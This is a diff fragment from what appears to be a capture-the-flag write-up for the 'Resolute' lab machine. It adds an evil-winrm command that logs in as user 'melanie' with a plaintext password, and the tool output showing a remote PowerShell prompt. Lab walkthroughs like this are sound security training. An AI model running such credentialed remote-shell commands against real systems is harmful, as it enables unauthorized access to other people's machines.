@@ -207,5 +207,15 @@ I have access over WINRM as this user
 
 ## Shell as `melanie`
 ```python
-
+evil-winrm -i resolute.megabank.local -u melanie -p 'Welcome123!'
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\melanie\Documents>
 ```
+Shell access as `melanie`
